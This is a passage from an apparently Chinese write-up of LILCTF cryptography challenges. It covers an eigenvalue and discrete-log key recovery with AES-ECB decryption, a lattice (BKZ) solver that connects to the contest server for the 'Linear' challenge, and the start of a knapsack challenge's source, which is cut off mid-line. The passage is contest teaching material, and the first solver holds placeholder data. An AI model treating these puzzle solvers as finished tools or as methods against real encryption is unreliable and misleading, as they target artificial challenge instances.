xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mi>e</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">key</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span> 扩展为 16 字节 AES 密钥</li><li>用 AES-ECB 加密填充后的 flag（填充至 64 字节）</li><li>输出 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo separator="true">,</mo><mi>C</mi><mo separator="true">,</mo><mi>D</mi></mrow><annotation encoding="application/x-tex">p, C, D</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span></span> 和密文 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>s</mi><mi>g</mi></mrow><annotation encoding="application/x-tex">msg</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span></span></span></span></li></ol><h4 id="4-攻击思路"><a class="markdownIt-Anchor" href="#4-攻击思路"></a> 4. <strong>攻击思路</strong></h4><ol><li><strong>提取特征值</strong>：<ul><li>计算 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi></mrow><annotation encoding="application/x-tex">C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span> 的特征值 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>c</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>c</mi><mn>3</mn></msub><mo separator="true">,</mo><msub><mi>c</mi><mn>4</mn></msub><mo separator="true">,</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">{c_1, c_2, c_3, c_4, 0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span></span></span></span></span></li><li>计算 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi></mrow><annotation encoding="application/x-tex">D</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span></span> 的特征值 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>d</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>d</mi><mn>3</mn></msub><mo separator="true">,</mo><msub><mi>d</mi><mn>4</mn></msub><mo separator="true">,</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">{d_1, d_2, d_3, d_4, 0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span></span></span></span></span></li></ul></li><li><strong>求解密钥</strong>：<ul><li>对每对非零特征值 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>c</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>d</mi><mi>j</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(c_i, d_j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 求解离散对数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mi>e</mi><msub><mi>y</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub><mo>=</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><msub><mi>c</mi><mi>i</mi></msub></msub><mo stretchy="false">(</mo><msub><mi>d</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mspace></mspace><mspace width="0.6666666666666666em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">key_{ij} = \log_{c_i}(d_j) \mod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.980548em;vertical-align:-0.286108em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.09424em;vertical-align:-0.34424em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.05725199999999997em;"><span style="top:-2.45586em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.34424em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6666666666666666em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span></span></span></span></li><li>验证 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mi>e</mi><msub><mi>y</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">key_{ij}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.980548em;vertical-align:-0.286108em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span> 是否满足所有特征值关系</li></ul></li><li><strong>解密 flag</strong>：<ul><li>用 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mi>e</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">key</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span> 重构 AES 密钥</li><li>AES-ECB 解密并去除填充</li></ul></li></ol><h3 id="解决方案代码"><a class="markdownIt-Anchor" href="#解决方案代码"></a> 解决方案代码</h3><p>python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> GF, matrix<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># ===== 输入数据替换为实际输出 =====</span><br>p = <span class="hljs-number">123456789</span>  <span class="hljs-comment"># 替换为实际的素数 p</span><br>C_list = [[...], [...], [...], [...], [...]]  <span class="hljs-comment"># 替换为实际的 5x5 矩阵 C</span><br>D_list = [[...], [...], [...], [...], [...]]  <span class="hljs-comment"># 替换为实际的 5x5 矩阵 D</span><br>msg = <span class="hljs-string">b&#x27;...&#x27;</span>  <span class="hljs-comment"># 替换为实际的密文字节串</span><br><br><span class="hljs-comment"># ===== 特征值计算 =====</span><br>Fp = GF(p)<br>C = matrix(Fp, C_list)<br>D = matrix(Fp, D_list)<br><br><span class="hljs-comment"># 计算特征值</span><br>c_evals = C.charpoly().roots(ring=Fp, multiplicities=<span class="hljs-literal">False</span>)<br>d_evals = D.charpoly().roots(ring=Fp, multiplicities=<span class="hljs-literal">False</span>)<br><br><span class="hljs-comment"># 过滤非零特征值</span><br>c_nonzero = [x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> c_evals <span class="hljs-keyword">if</span> x != Fp(<span class="hljs-number">0</span>)]<br>d_nonzero = [y <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> d_evals <span class="hljs-keyword">if</span> y != Fp(<span class="hljs-number">0</span>)]<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(c_nonzero) != <span class="hljs-number">4</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">len</span>(d_nonzero) != <span class="hljs-number">4</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;错误：非零特征值数量不足&quot;</span>)<br>    sys.exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># ===== 求解离散对数恢复密钥 =====</span><br>key_found = <span class="hljs-literal">None</span><br><span class="hljs-keyword">for</span> c_val <span class="hljs-keyword">in</span> c_nonzero:<br>    <span class="hljs-keyword">for</span> d_val <span class="hljs-keyword">in</span> d_nonzero:<br>        <span class="hljs-keyword">try</span>:<br>            k = d_val.log(c_val)  <span class="hljs-comment"># k = log_&#123;c_val&#125;(d_val)</span><br>            <span class="hljs-keyword">if</span> k &lt; <span class="hljs-number">2</span>**<span class="hljs-number">62</span>:<br>                <span class="hljs-keyword">continue</span><br>            <br>            <span class="hljs-comment"># 验证所有特征值</span><br>            valid = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> c_nonzero:<br>                <span class="hljs-keyword">if</span> x**k <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> d_nonzero:<br>                    valid = <span class="hljs-literal">False</span><br>                    <span class="hljs-keyword">break</span><br>                    <br>            <span class="hljs-keyword">if</span> valid:<br>                key_found = k<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 找到密钥: <span class="hljs-subst">&#123;k&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> key_found <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">if</span> key_found <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] 密钥恢复失败&quot;</span>)<br>    sys.exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># ===== AES 解密 =====</span><br>key_bytes = long_to_bytes(key_found)<br>pad_len = <span class="hljs-number">16</span> - <span class="hljs-built_in">len</span>(key_bytes)<br>key_padded = key_bytes + <span class="hljs-built_in">bytes</span>([pad_len] * pad_len)  <span class="hljs-comment"># PKCS#7 填充</span><br><br><span class="hljs-keyword">try</span>:<br>    cipher = AES.new(key_padded, AES.MODE_ECB)<br>    flag_padded = cipher.decrypt(msg)<br>    flag = unpad(flag_padded, <span class="hljs-number">64</span>)  <span class="hljs-comment"># 移除填充</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Flag: <span class="hljs-subst">&#123;flag.decode()&#125;</span>&quot;</span>)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] 解密失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="linear"><a class="markdownIt-Anchor" href="#linear"></a> Linear</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> signal<br><br>signal.alarm(<span class="hljs-number">10</span>)<br><br>flag = os.getenv(<span class="hljs-string">&quot;LILCTF_FLAG&quot;</span>, <span class="hljs-string">&quot;LILCTF&#123;default&#125;&quot;</span>)<br><br>nrows = <span class="hljs-number">16</span><br>ncols = <span class="hljs-number">32</span><br><br>A = [[random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">1919810</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ncols)] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nrows)]<br>x = [random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">114514</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ncols)]<br><br>b = [<span class="hljs-built_in">sum</span>(A[i][j] * x[j] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ncols)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nrows)]<br><span class="hljs-built_in">print</span>(A)<br><span class="hljs-built_in">print</span>(b)<br><br>xx = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Enter your solution: &quot;</span>).strip().split()))<br><span class="hljs-keyword">if</span> xx != x:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Oh, your linear algebra needs to be practiced.&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Bravo! Here is your flag:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>类似于背包，参考ezbag：<a href="https://naby1.github.io/2025/02/12/hgame2025_1/#ezbag">HGAME2025-Crypto - Naby的博客</a></p><p>就多乘一个数，尽量得到最小向量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> ast<br>sh = remote(<span class="hljs-string">&quot;challenge.xinshi.fun&quot;</span>,<span class="hljs-number">47837</span>)<br><br>A=ast.literal_eval(sh.recvline().decode())<br>b=ast.literal_eval(sh.recvline().decode())<br><br>nrows = <span class="hljs-number">16</span><br>ncols = <span class="hljs-number">32</span><br>N=<span class="hljs-number">2</span>**<span class="hljs-number">32</span><br><br>L=Matrix(ZZ,ncols+<span class="hljs-number">1</span>,ncols+nrows)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ncols):<br>    L[i,i]=<span class="hljs-number">2</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nrows):<br>        L[i,ncols+j]=A[j][i]*N<br>L[-<span class="hljs-number">1</span>,:]=<span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nrows):<br>    L[-<span class="hljs-number">1</span>,ncols+j]=b[j]*N<br>x=L.BKZ()<br><br>x=[(<span class="hljs-built_in">abs</span>(<span class="hljs-built_in">int</span>(i))+<span class="hljs-number">1</span>)//<span class="hljs-number">2</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x[<span class="hljs-number">0</span>][:ncols]]<br>res=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x:<br>    res+= <span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27; &#x27;</span><br>sh.sendlineafter(<span class="hljs-string">b&#x27;solution: &#x27;</span>,res.encode())<br><span class="hljs-built_in">print</span>(sh.recvall())<br>sh.close()<br></code></pre></td></tr></table></figure><h2 id="baaaaaag"><a class="markdownIt-Anchor" href="#baaaaaag"></a> baaaaaag</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br>p = random.getrandbits(<span class="hljs-number">72</span>)<br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>(p)[<span class="hljs-number">2</span>:]) == <span class="hljs-number">72</span><br><br>a = [getPrime(<span class="hljs-number">90</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">72</span>)]<br>b = <span class="hljs-number">0</span><br>t = p<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    temp = t % <span class="hljs-number">2</span><br>    b += temp * i<br>    t = t &gt;&gt; <span class="hljs-number">1</span><br><br>key = hashlib.sha256(<span class="hljs-built_in">str</span>(p).encode()).digest()<br>cipher = AES.new(key, AES.MODE_ECB)<br>flag = pad(flag,<span class="hljs-number">16</span>)<br>ciphertext = cipher.encrypt(flag)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;a = <span class="hljs-subst">&#123;a&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;b = <span 